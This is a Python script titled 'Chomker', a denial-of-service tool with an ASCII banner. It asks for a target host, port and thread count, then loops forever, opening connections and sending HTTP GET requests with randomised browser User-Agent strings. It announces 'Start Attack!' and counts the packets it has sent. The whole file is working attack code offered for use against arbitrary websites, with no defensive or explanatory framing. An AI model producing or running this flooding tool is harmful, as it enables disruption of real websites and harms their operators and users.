# Chomker
import time, sys, socket, urllib.request, random

import os
import sys
import optparse
import threading
import socket
import random
 
 
global headers,host,port, alive
 
User_Agent = ["Linux / Firefox 29: Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Linux / Chrome 34: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
"Mac / Firefox 29: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mac / Chrome 34: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
"Mac / Safari 7: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
"Windows / Firefox 29: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Windows / Chrome 34: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36",
"Windows / IE 6: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Windows / IE 7: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
"Windows / IE 8: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
"Windows / IE 9: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Windows / IE 10: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
"Windows / IE 11: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Android / Firefox 29: Mozilla/5.0 (Android; Mobile; rv:29.0) Gecko/29.0 Firefox/29.0",
"Android / Chrome 34: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36",
"iOS / Chrome 34: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53",
"iOS / Safari 7: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53"]
 
header = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language: en-us,en;q=0.5","Accept-Encoding: gzip,deflate","Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7","Keep-Alive: 115","Connection: keep-alive"]
 
headers = ' \n'.join(header)
ak = 0 
 
def Banner():
    print("\t     /\            /\            /\            /\            /|            /\            /\    ")
    print("\t    /:/            \:\          /::\          |::\          |:|           /:/           /::\   ")
    print("\t   /:/              \:\        /:/\:\         |:|:\         |:|          /:/ /\        /:/\:\  ")
    print("\t  /:/               /::\      /:/  \:\      __|:|\:\        |:|         /:/ /:/       /:/ /:/  ")
    print("\t /:/     /\    /\  /:/\:\    /:/    \:\    /::::| \:\    /\_|:|____    /:/ /:/ /\    /:/ /:/___")
    print("\t \:\    /:/    \:\/:/  \/    \:\    /:/    \:\     \/    \:\/:::::/    \:\/:/ /:/    \:\/:::::/")
    print("\t  \:\  /:/      \::/          \:\  /:/      \:\           \::/~~~~      \::/ /:/      \::/~~~~ ")
    print("\t   \:\/:/        \:\           \:\/:/        \:\           \:\           \:\/:/        \:\     ")
    print("\t    \::/          \:\           \::/          \:\           \:\           \::/          \:\    ")
    print("\t     \/            \/            \/            \/            \/            \/            \/    \n")
    print("\t\t\t Coded By Chomikuj.pl\n")

def dos(host,port,num):
        try:
            sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        except socket.error:
            print("Error:")
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print("[-] Could not resolve hostname.")
            os._exit(0)
        else:
            query = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(User_Agent)+"\n"+headers).encode('utf-8')
            if sock.connect_ex((host,port))==0:
                if sock.sendall(query)==None:
                    sock.close()
                else:
                    print("["+str(num)+"/"+str(num)+"] #### Error while sending! to: "+str(host))
                    os._exit(0)
 
if __name__ == "__main__":
    target = input("input target")
    port = input("port (usually 80)")
    threads = input("number of threads (reccommended 1)")
    
    if target == None:
        Banner()
        print("bro what. Is that even an IP?")
        sys.exit()
 
    host = target
    port = int(port)
    threads = int(threads)
 
    if target is not None:
        Banner()
        print("=------ [+] Start Attack! =------")
        print("=------ [+] Site: "+host+" =------")
        print("=------ [+] Port: "+str(port)+" =------")
        print("=------ [+] Threads: "+str(threads)+" =------")
        print("\n")
        try:
            while True:
                for x in range(16):
                    ak = ak +1
                    th=threading.Thread(target=dos,args=(host,port,ak),name="User-"+str(1))
                    th.Deamon=True
                    th.start()
                    th.join()
                print("\tSuccesfully sent 16 packets")
        except KeyboardInterrupt:
                print("\n\t[-] You're pressed Ctrl+C\n")
                os._exit(0)